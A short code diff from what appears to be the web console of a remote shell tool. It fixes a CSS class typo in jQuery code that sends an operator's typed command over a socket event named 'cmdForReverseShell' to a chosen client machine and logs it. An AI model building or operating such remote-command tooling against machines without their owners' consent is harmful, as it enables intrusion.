@@ -225,7 +225,7 @@
                   var cmd      = $(".cmdForReverseShell").val();
                   socket.emit("cmdForReverseShell", clientId, adminId, cmd);
                   $(".cmdForReverseShell").val("");
-                  $(".remoteShell").append("<p class='logs-succes'>Cmd: "+cmd+"</p>");
+                  $(".remoteShell").append("<p class='logs-success'>Cmd: "+cmd+"</p>");
                 }
             });
             // Callback reverse shell
